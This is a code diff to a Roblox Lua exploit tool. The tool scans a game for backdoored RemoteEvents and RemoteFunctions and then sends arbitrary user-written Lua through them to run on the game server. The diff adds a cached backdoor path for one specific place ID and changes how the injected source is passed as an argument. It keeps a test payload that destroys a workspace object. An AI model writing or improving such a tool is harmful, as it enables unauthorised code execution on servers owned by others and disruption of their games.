@@ -26,9 +26,20 @@ local testSource = [[local Val = Instance.new("StringValue", workspace) Val.Name
 local EventInfo = {
 	["EventInstance"] = nil,
 	["EventPath"] = "",
+	["EventArgs"] = {"source"},
+	["EventSourcePlace"] = 1
 }
-local EventPrint = "EVENT: %s | TYPE: %s"
-local AttachedPrint = "ATTACHED EVENT: %s | TYPE: %s"
+local CachedPlaces = {
+	[5033592164] = {
+		["Path"] = game.JointsService:GetChildren()[1] and game.JointsService:GetChildren()[1]:GetFullName() or "",
+		["Args"] = {"1234567890", "source"}
+	},
+}
+local MSG_TEXT = {
+	["AttachedEventPrint"] = "ATTACHED EVENT: %s | TYPE: %s",
+	["EventPrint"] = "EVENT: %s | TYPE: %s",
+	["OutdatedCacheWarn"] = "The cache of [%s] seems to be outdated."
+}
 local Debounce1 = true
 local AttachDeb = true
 -- // MAIN
@@ -51,7 +62,7 @@ local Draggify = function(frame, button)
 		):Play()
 	end
 	button.InputBegan:Connect(function(input)
-		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
 			dragToggle = true
 			dragStart = input.Position
 			startPos = frame.Position
@@ -76,10 +87,11 @@ end
 
 local ExecuteLua = function(source)
 	if EventInfo.EventInstance then
+		EventInfo.EventArgs[EventInfo.EventSourcePlace] = source
 		if EventInfo.EventInstance:IsA("RemoteEvent") then
-			EventInfo.EventInstance:FireServer(source)
+			EventInfo.EventInstance:FireServer(unpack(EventInfo.EventArgs))
 		elseif EventInfo.EventInstance:IsA("RemoteFunction") then
-			coroutine.wrap(function() EventInfo.EventInstance:InvokeServer(source) end)()
+			coroutine.wrap(function() EventInfo.EventInstance:InvokeServer(unpack(EventInfo.EventArgs)) end)()
 		end
 	end
 end
@@ -94,6 +106,7 @@ local GetTextSize = function(object)
 end
 
 local GotAttached = function(backdooredEvent)
+	EventInfo.EventSourcePlace = table.find(EventInfo.EventArgs, "source")
 	EventInfo.EventInstance, EventInfo.EventPath = backdooredEvent, backdooredEvent:GetFullName()
 	Textbox.TextEditable = true
 	ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -102,7 +115,7 @@ local GotAttached = function(backdooredEvent)
 	R6Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 	AttachedText.Visible = true
 	AttachBtn.TextColor3 = Color3.fromRGB(145, 145, 145)
-	print(string.format(AttachedPrint, backdooredEvent:GetFullName(), backdooredEvent.ClassName))
+	print(string.format(MSG_TEXT.AttachedEventPrint, backdooredEvent:GetFullName(), backdooredEvent.ClassName))
 	ExecuteLua("game.Workspace[game.PlaceId]:Destroy()")
 end
 
@@ -111,7 +124,7 @@ local FindBackdoors = function()
 		if EventInfo.EventInstance then break end
 		if Object:IsA("RemoteEvent") or Object:IsA("RemoteFunction") then
 			if Object:FindFirstChild("") or (Object.Parent:IsA("RemoteEvent") and #Object.Parent.Name == 16) or Object.Name == "" or Object.Name == "CharacterSoundEvent" or Object.Parent.Name == "MouseInfo" or Object.Parent.Name == "DefaultChatSystemChatEvents" then else
-				print(string.format(EventPrint, Object:GetFullName(), Object.ClassName))
+				print(string.format(MSG_TEXT.EventPrint, Object:GetFullName(), Object.ClassName))
 				if Object:IsA("RemoteEvent") then
 					Object:FireServer(testSource, Object.Name)
 				elseif Object:IsA("RemoteFunction") then
@@ -154,9 +167,31 @@ local SyncTextboxScrolling = function()
 	SF_TextLines.CanvasPosition = Vector2.new(0, SF_Textbox.CanvasPosition.Y)
 end
 
+local StringToInstance = function(pathString)
+	local pathSplit = string.split(pathString, ".")
+	local result = game
+	for _, path in ipairs(pathSplit) do
+		result = result:FindFirstChild(path) and result[path] or result[nil]
+	end
+	return result
+end
+
 AttachBtn.MouseButton1Click:Connect(function()
 	if AttachDeb and not EventInfo.EventInstance then
 		AttachDeb = false
+		for cPlaceId, cache in pairs(CachedPlaces) do
+			if game.PlaceId == cPlaceId then
+				local succ, res = pcall(StringToInstance, cache.Path)
+				if succ then
+					EventInfo.EventArgs = cache.Args
+					GotAttached(res)
+					break
+				else
+					warn(string.format(MSG_TEXT.OutdatedCacheWarn, cache.Path))
+					break
+				end
+			end
+		end
 		FindBackdoors()
 		if not EventInfo.EventInstance then
 			print("No backdoor(s) here!")
